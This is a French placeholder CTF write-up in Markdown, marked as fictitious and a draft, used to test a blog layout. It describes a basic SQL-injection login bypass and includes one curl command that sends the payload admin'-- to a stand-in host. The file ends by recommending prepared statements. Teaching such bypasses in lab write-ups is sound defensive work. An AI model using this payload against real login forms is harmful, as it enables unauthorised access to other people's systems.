---
title: "EXEMPLE — Injection SQL basique"
ctf: CTF d'exemple (à supprimer)
category: web
difficulty: easy
points: 100
date: 2026-01-15
tags: [sqli, exemple]
summary: "Writeup fictif pour visualiser la mise en page. Brouillon : invisible en production."
lang: fr
draft: true
---

> Ceci est un **exemple factice** pour tester la mise en page. Supprimez ce fichier quand vous publiez votre premier vrai writeup.

## Reconnaissance

Le formulaire de connexion renvoie une erreur SQL quand on saisit une apostrophe.

## Exploitation

```bash
curl -s 'http://cible.local/login' --data "user=admin'--&pass=x"
```

| Étape | Résultat |
|---|---|
| Apostrophe | Erreur SQL |
| Commentaire `--` | Authentification contournée |

## Solution

Le contournement de l'authentification donne accès au panneau d'administration.

### Ce que j'ai appris

Toujours utiliser des requêtes préparées.
